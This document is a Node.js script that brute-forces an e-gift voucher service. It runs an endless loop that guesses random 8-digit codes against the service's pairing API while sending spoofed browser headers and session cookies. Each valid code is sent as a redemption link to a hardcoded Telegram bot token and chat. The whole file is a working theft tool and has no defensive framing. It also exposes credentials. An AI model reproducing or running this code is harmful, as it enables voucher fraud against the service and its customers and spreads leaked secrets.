const request = require("request");
const inquirer = require('inquirer');
const randomstring = require("randomstring");
const question = [
    {
        type: 'text',
        name: 'sleep',
        message: 'Sleep (ms):'
    }
];
function send(text){
    var bar = "https://e.gift.id/r/8346/"+text;
var options = { method: 'GET',
  url: 'https://api.telegram.org/bot715108836:AAHk0g6zwsf_qXSqNyrI-UJI91aR8W3JA2I/sendMessage',
  qs: { chat_id: '421000460', parse_mode: 'html', text: bar },
  headers: 
   { 'postman-token': 'abecbc45-633e-8a3a-a55f-23f711efdcd2',
     'cache-control': 'no-cache' } };

request(options, function (error, response, body) {
  if (error) throw new Error(error);
//console.log("Sent!");
  //return ("Sent");
});

}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};
const cek = async () => {
var kode = randomstring.generate({
  length: 8,
  charset: 'numeric'
});
var options = { method: 'GET',
    //proxy: 'http://'+proxy,
  url: 'https://e.gift.id/api/egifts/external_pair/8346/'+kode,
  headers: 
   { 'postman-token': '0ddcf36f-c2d1-ca13-06e4-9b986f751d98',
     'cache-control': 'no-cache',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
     'upgrade-insecure-requests': '1',
     cookie: '__cfduid=d1612dd53c020baf7c9e280252b76240e1542283759; AWSELB=6FE5759318BCD42A878246213CF176F7A815741306C2309C7D09E57ACB627171B19C3A5BF15EE3ABF666329A15B40FF32D9755F02DC39F72A366E51A60E068EB265D83FF6E; ms-ga-sess=hTg0LClEnUfZne61iQKn7UxZTCamogtEaaMP5iy7hg7SCWuxIsozMWTxPmMMCxVz06ciCQOXTYa32bpqeGDAMFRYtARjgPMM9CCaAvDjgoEvPqKmpSyJAsP87AXScaODLIQJ3Tq9ciNZi2heGHrabUBXfZfq29lKWJS5K1mWjq475omDtkPL1vVlb2IvJu64PeBqx82xOsinYBxreYQHT1HdRDfGuaDCfFNyq3tCX1ixZ2RetwpMBg5rP1x9krV1',
     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
     accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' } };

request(options, function (error, response, body) {
  if (error) throw new Error(error);
    var json = JSON.parse(body);
    //console.log(json);
  //console.log(kode+"|"+json.body.message);
  if(json.success == true){
      //send(kode);
      send(kode);
      console.log(kode+"|Sent!");
  }else{
      console.log(kode+"|Bad");
  }
});
};
inquirer
    .prompt(question)
    .then(a => {
        (async () => {
            //for (let i = 0; i < 100; i++) {
            while(true){
                await cek();
                await sleep(a.sleep);
            }
        })();
    });
